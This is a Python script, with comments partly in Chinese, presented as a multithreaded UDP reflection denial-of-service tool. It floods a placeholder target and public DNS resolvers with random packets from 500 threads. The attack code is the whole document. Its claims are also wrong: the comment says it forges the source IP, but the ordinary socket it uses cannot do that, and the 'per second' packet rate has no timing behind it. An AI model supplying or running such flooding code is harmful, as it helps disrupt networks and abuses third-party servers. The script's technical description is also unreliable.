import socket
import random
import threading


def udp_reflection_attack(target_ip, target_port, reflector_info, num_packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # 伪造源IP地址为目标IP地址
    for _ in range(num_packets):
        reflector_ip, reflector_port = random.choice(reflector_info)  # 随机选择一个反射服务器IP和端口
        data = random._urandom(1024)
        sock.sendto(data, (reflector_ip, reflector_port))
        sock.sendto(data, (target_ip, target_port))

    sock.close()


target_ip = "192.168.1.1"  # Replace with the target IP address
target_port = 80  # Replace with the target port

reflector_info = [
    ("8.8.8.8", 53),  # Google DNS
    ("8.8.4.4", 53),  # Google DNS
    ("1.1.1.1", 53),  # Cloudflare DNS
    ("1.0.0.1", 53),  # Cloudflare DNS
    ("208.67.222.222", 53),  # OpenDNS
    ("208.67.220.220", 53),  # OpenDNS
    ("123.123.123.123", 123)  # Customized NTP servers
]

num_packets = 1000  # Number of reflected packets sent per second

for i in range(500):
    thread = threading.Thread(target=udp_reflection_attack, args=(target_ip, target_port, reflector_info, num_packets))
    thread.start()
